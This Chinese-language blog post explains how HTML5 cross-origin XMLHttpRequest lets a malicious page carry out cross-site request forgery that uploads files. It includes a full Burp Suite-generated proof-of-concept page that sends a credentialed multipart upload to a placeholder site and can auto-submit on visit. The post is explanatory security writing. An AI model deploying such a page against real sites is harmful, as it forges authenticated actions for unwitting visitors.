---
layout: post
title: "csrf upload file"
description: ""
category: 
tags: []
---
{% include JB/setup %}

大家都知道通常用csrf来上传一个文件是不简单的.问题在于我们创建的假的表单提交的数据跟浏览器文件上传提交的数据有一点不同.那就是上传的请求会有一个filename的参数:

	-----------------------------256672629917035
	Content-Disposition: form-data; name="file"; filename="test2.txt"
	Content-Type: text/plain          
	test3
	-----------------------------256672629917035

如果我们创建一个表单,提交如上的请求是没法成功添加filename参数的,这是因为filename参数是文件上传的input自动生成.这就阻止了邪恶的黑客通过csrf上传文件.不过自从有了html5,一切都不一样了.

html5有一个新特性叫跨域资源共享(CORS http://www.w3.org/TR/cors/).在过去,由于同源策略的影响,黑客没办法通过javascript去访问别的域.考虑到XSS这么泛滥,同源策略真的是让我们的生活更安全了.不过,利用html5的跨域资源共享,可以让javascript来发送有filename属性的合法的跨域请求.这样,只要用户访问了恶意页面,不需要其他的交互,就可以通过csrf来上传文件了.

下面是一个Burp Suite生成的poc.



	<html>
	  <!-- CSRF PoC - generated by Burp Suite Professional -->
	  <body>
	    <script>
	      function submitRequest()
	      {
	        var xhr = new XMLHttpRequest();
	        xhr.open("POST", "https://example.com/new_file.html", true);
	        xhr.setRequestHeader("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8");
	        xhr.setRequestHeader("Accept-Language", "de-de,de;q=0.8,en-us;q=0.5,en;q=0.3");
	        xhr.setRequestHeader("Content-Type", "multipart/form-data; boundary=---------------------------256672629917035");
	        xhr.withCredentials = "true";
	        var body = "-----------------------------256672629917035\r\n" +
	          "Content-Disposition: form-data; name=\"message\"\r\n" +
	          "\r\n" +
	          "\r\n" +
	          "-----------------------------256672629917035\r\n" +
	          "Content-Disposition: form-data; name=\"backPage\"\r\n" +
	          "\r\n" +
	          "test\r\n" +
	          "-----------------------------256672629917035\r\n" +
	          "Content-Disposition: form-data; name=\"dataType\"\r\n" +
	          "\r\n" +
	          "test  \r\n" +
	          "-----------------------------256672629917035\r\n" +
	          "Content-Disposition: form-data; name=\"file\"; filename=\"test2.txt\"\r\n" +
	          "Content-Type: text/plain\r\n" +
	          "\r\n" +
	          "test3\r\n" +
	          "-----------------------------256672629917035--\r\n";
	        var aBody = new Uint8Array(body.length);
	        for (var i = 0; i < aBody.length; i++)
	          aBody[i] = body.charCodeAt(i);
	        xhr.send(new Blob([aBody]));
	      }
	    </script>
	    <form action="#">
	      <input type="submit" value="Submit request" onclick="submitRequest();" />
	    </form>
	  </body>
	</html>


当然,poc里的提交按钮不是必须的,可以通过javascript自动提交.从某种程度上来说浏览器的最重要的同源策略被突破了.这真是令人忧伤的一件事情.

扩展阅读:

http://blog.kotowicz.net/2011/05/cross-domain-arbitrary-file-upload.html
http://blog.kotowicz.net/2011/04/how-to-upload-arbitrary-file-contents.html
https://developer.mozilla.org/en-US/docs/HTTP/Access_control_CORS?redirectlocale=en-US&redirectslug=HTTP_access_control
http://www.w3.org/TR/cors/

